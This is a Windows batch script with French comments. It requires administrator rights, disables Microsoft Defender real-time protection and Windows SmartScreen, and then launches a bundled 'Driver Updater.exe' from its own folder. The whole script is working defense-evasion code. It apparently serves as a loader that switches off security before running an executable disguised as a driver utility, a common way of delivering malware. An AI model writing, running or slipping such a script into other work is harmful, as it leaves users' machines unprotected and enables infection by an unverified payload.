@echo off
:: Vérifie que le script est exécuté en tant qu'administrateur
net session >nul 2>&1 || (
    echo Ce script doit être exécuté en tant qu'administrateur.
    pause
    exit
)

:: Désactivation de Microsoft Defender
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
echo Microsoft Defender a été désactivé.

:: Désactivation de Windows SmartScreen
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f
echo Windows SmartScreen a été désactivé.

:: Exécution de l'exécutable dans le même dossier que le .bat
echo Lancement du fichier .exe...
timeout /t 5 /nobreak >nul
start "" "%~dp0Driver Updater.exe"

pause